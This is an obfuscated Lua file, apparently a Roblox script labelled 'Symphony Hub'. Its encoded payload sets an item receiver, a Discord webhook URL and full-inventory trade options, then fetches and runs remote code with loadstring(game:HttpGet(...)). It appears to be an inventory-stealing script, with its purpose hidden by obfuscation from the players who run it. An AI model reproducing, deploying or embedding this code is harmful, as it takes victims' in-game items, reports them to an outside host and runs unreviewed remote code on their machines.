--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.6) ~  Much Love, Ferib 

]]--

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			local FlatIdent_7126A = 0;
			while true do
				if (FlatIdent_7126A == 0) then
					repeatNext = StrToNumber(Sub(byte, 1, 1));
					return "";
				end
			end
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local FlatIdent_17196 = 0;
		local a;
		while true do
			if (FlatIdent_17196 == 1) then
				return a;
			end
			if (FlatIdent_17196 == 0) then
				a = Byte(ByteString, DIP, DIP);
				DIP = DIP + 1;
				FlatIdent_17196 = 1;
			end
		end
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				local FlatIdent_5BA5E = 0;
				while true do
					if (FlatIdent_5BA5E == 0) then
						Exponent = 1;
						IsNormal = 0;
						break;
					end
				end
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			local FlatIdent_74348 = 0;
			while true do
				if (FlatIdent_74348 == 0) then
					Len = gBits32();
					if (Len == 0) then
						return "";
					end
					break;
				end
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local FlatIdent_6B983 = 0;
			local Type;
			local Cons;
			while true do
				if (FlatIdent_6B983 == 1) then
					if (Type == 1) then
						Cons = gBits8() ~= 0;
					elseif (Type == 2) then
						Cons = gFloat();
					elseif (Type == 3) then
						Cons = gString();
					end
					Consts[Idx] = Cons;
					break;
				end
				if (FlatIdent_6B983 == 0) then
					Type = gBits8();
					Cons = nil;
					FlatIdent_6B983 = 1;
				end
			end
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					local FlatIdent_287B5 = 0;
					while true do
						if (FlatIdent_287B5 == 0) then
							Inst[3] = gBits16();
							Inst[4] = gBits16();
							break;
						end
					end
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					local FlatIdent_4CC24 = 0;
					while true do
						if (FlatIdent_4CC24 == 0) then
							Inst[3] = gBits32() - (2 ^ 16);
							Inst[4] = gBits16();
							break;
						end
					end
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				local FlatIdent_6DC53 = 0;
				while true do
					if (0 == FlatIdent_6DC53) then
						Inst = Instr[VIP];
						Enum = Inst[1];
						FlatIdent_6DC53 = 1;
					end
					if (1 == FlatIdent_6DC53) then
						if (Enum <= 7) then
							if (Enum <= 3) then
								if (Enum <= 1) then
									if (Enum == 0) then
										local A = Inst[2];
										local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
										Top = (Limit + A) - 1;
										local Edx = 0;
										for Idx = A, Top do
											local FlatIdent_60EA1 = 0;
											while true do
												if (FlatIdent_60EA1 == 0) then
													Edx = Edx + 1;
													Stk[Idx] = Results[Edx];
													break;
												end
											end
										end
									else
										Stk[Inst[2]]();
									end
								elseif (Enum > 2) then
									Env[Inst[3]] = Stk[Inst[2]];
								else
									do
										return;
									end
								end
							elseif (Enum <= 5) then
								if (Enum > 4) then
									local FlatIdent_6C033 = 0;
									local A;
									local T;
									while true do
										if (0 == FlatIdent_6C033) then
											A = Inst[2];
											T = Stk[A];
											FlatIdent_6C033 = 1;
										end
										if (FlatIdent_6C033 == 1) then
											for Idx = A + 1, Inst[3] do
												Insert(T, Stk[Idx]);
											end
											break;
										end
									end
								else
									Stk[Inst[2]][Inst[3]] = Inst[4];
								end
							elseif (Enum == 6) then
								local FlatIdent_31A5A = 0;
								local A;
								local T;
								local B;
								while true do
									if (FlatIdent_31A5A == 1) then
										B = Inst[3];
										for Idx = 1, B do
											T[Idx] = Stk[A + Idx];
										end
										break;
									end
									if (FlatIdent_31A5A == 0) then
										A = Inst[2];
										T = Stk[A];
										FlatIdent_31A5A = 1;
									end
								end
							else
								Stk[Inst[2]] = Env[Inst[3]];
							end
						elseif (Enum <= 11) then
							if (Enum <= 9) then
								if (Enum > 8) then
									local FlatIdent_31905 = 0;
									local B;
									local A;
									while true do
										if (1 == FlatIdent_31905) then
											Stk[Inst[2]][Inst[3]] = Inst[4];
											VIP = VIP + 1;
											Inst = Instr[VIP];
											Stk[Inst[2]][Inst[3]] = Inst[4];
											VIP = VIP + 1;
											FlatIdent_31905 = 2;
										end
										if (FlatIdent_31905 == 2) then
											Inst = Instr[VIP];
											Stk[Inst[2]][Inst[3]] = Inst[4];
											VIP = VIP + 1;
											Inst = Instr[VIP];
											Stk[Inst[2]][Inst[3]] = Inst[4];
											FlatIdent_31905 = 3;
										end
										if (5 == FlatIdent_31905) then
											Inst = Instr[VIP];
											Stk[Inst[2]] = Env[Inst[3]];
											VIP = VIP + 1;
											Inst = Instr[VIP];
											A = Inst[2];
											FlatIdent_31905 = 6;
										end
										if (FlatIdent_31905 == 4) then
											Env[Inst[3]] = Stk[Inst[2]];
											VIP = VIP + 1;
											Inst = Instr[VIP];
											Stk[Inst[2]] = Env[Inst[3]];
											VIP = VIP + 1;
											FlatIdent_31905 = 5;
										end
										if (FlatIdent_31905 == 6) then
											B = Stk[Inst[3]];
											Stk[A + 1] = B;
											Stk[A] = B[Inst[4]];
											break;
										end
										if (0 == FlatIdent_31905) then
											B = nil;
											A = nil;
											Stk[Inst[2]][Inst[3]] = Inst[4];
											VIP = VIP + 1;
											Inst = Instr[VIP];
											FlatIdent_31905 = 1;
										end
										if (FlatIdent_31905 == 3) then
											VIP = VIP + 1;
											Inst = Instr[VIP];
											Stk[Inst[2]][Inst[3]] = Inst[4];
											VIP = VIP + 1;
											Inst = Instr[VIP];
											FlatIdent_31905 = 4;
										end
									end
								else
									Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
								end
							elseif (Enum > 10) then
								VIP = Inst[3];
							else
								for Idx = Inst[2], Inst[3] do
									Stk[Idx] = nil;
								end
							end
						elseif (Enum <= 13) then
							if (Enum == 12) then
								if (Stk[Inst[2]] == Inst[4]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								Stk[Inst[2]] = {};
							end
						elseif (Enum <= 14) then
							local FlatIdent_703C8 = 0;
							local A;
							local B;
							while true do
								if (FlatIdent_703C8 == 0) then
									A = Inst[2];
									B = Stk[Inst[3]];
									FlatIdent_703C8 = 1;
								end
								if (FlatIdent_703C8 == 1) then
									Stk[A + 1] = B;
									Stk[A] = B[Inst[4]];
									break;
								end
							end
						elseif (Enum == 15) then
							local FlatIdent_1B51D = 0;
							local A;
							while true do
								if (FlatIdent_1B51D == 0) then
									A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
									break;
								end
							end
						else
							Stk[Inst[2]] = Inst[3];
						end
						VIP = VIP + 1;
						break;
					end
				end
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!143O00028O0003063O00436F6E66696703093O0052656365697665727303053O0045717A5F7303073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31322O36303433323539332O393034353334312F6C474C4158396F556A4955334E30634554516D774837336841706267483350365449653542695447417075334D594B6B4D5A4C6D7A5245536A4A384E755641696B705F6C030D3O0046752O6C496E76656E746F72792O01030D3O00472O6F644974656D734F6E6C790100030B3O00526573656E64547261646503073O002E726573656E6403063O00536372697074030C3O0053796D70686F6E7920487562030A3O00437573746F6D4C696E6B034O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034E3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F523354482D505249562F55494C6962732F6D61696E2F4C696272617279732F496D706163742F536F75726365001F3O0012103O00014O000A000100013O00260C3O00020001000100040B3O00020001001210000100013O00260C000100050001000100040B3O000500012O000D00023O00072O000D000300013O001210000400044O000600030001000100100800020003000300300900020005000600302O00020007000800302O00020009000A00302O0002000B000C00302O0002000D000E00302O0002000F001000122O000200023O00122O000200113O00122O000300123O00202O000300030013001210000500146O000300054O000F00023O00022O000100020001000100040B3O001E000100040B3O0005000100040B3O001E000100040B3O000200012O00023O00017O00", GetFEnv(), ...);
